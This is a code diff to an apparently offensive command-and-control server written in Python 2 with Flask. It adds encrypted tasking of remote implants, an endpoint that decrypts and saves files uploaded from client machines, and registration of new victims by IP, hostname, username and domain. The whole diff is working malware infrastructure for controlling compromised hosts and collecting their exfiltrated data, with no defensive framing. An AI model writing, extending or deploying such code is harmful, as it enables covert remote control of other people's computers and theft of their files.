@@ -78,7 +78,7 @@ class NewListener:
             proto = "http"
 
         pcode = f.read()
-        return pcode.replace("SRVHOST", self.host).replace("OCU_INTERVAL", str(self.interval)).replace("OCU_PROTO", proto).replace("OCT_KEY", aes_encryption_key)
+        return pcode.replace("SRVHOST", self.host+":"+self.bindport).replace("OCU_INTERVAL", str(self.interval)).replace("OCU_PROTO", proto).replace("OCT_KEY", aes_encryption_key)
 
 
 
@@ -89,12 +89,13 @@ class NewListener:
 
 @app.route("/file_receiver", methods=["POST"])
 def fr():
-    #filename = request.headers['filename']
-    #f = open(filename, "wb")
-    print request.form[0]
-    #encoded_data = request.form["data"].encode("UTF-16LE")
-    #data = base64.b64decode(encoded_data)
-    #f.write(data)
+    filename = decrypt_command(aes_encryption_key, request.form["fn"].replace(" ","+"))
+    f = open(filename, "wb")
+    fdata = request.form["token"].replace(" ", "+")
+    raw_base64 = decrypt_command(aes_encryption_key, fdata)
+    print raw_base64
+    ready_to_write = base64.b64decode(raw_base64)
+    f.write(ready_to_write)
     f.close()
     print colored("\n[+] File %s downloaded from the client !" % filename, "green")
     return "True"
@@ -107,9 +108,8 @@ def command(hostname):
             connections_information[required_key][6] = time.ctime()
     try:
             command_to_execute = commands[hostname]
-            commands[hostname] = base64.b64encode("False")
+            commands[hostname] = encrypt_command(aes_encryption_key, "False")
     except KeyError:
-            print colored("[-] Receiving unknown pings", "red")
             return "False"
     return command_to_execute
 
@@ -141,7 +141,7 @@ def first_ping():
             last_ping = time.ctime()
             connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
             print "\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter)
-            commands[hostname] = base64.b64encode("False")
+            commands[hostname] = encrypt_command(aes_encryption_key, "False")
             counter = counter + 1
             return "GoodToGo"
     #except:
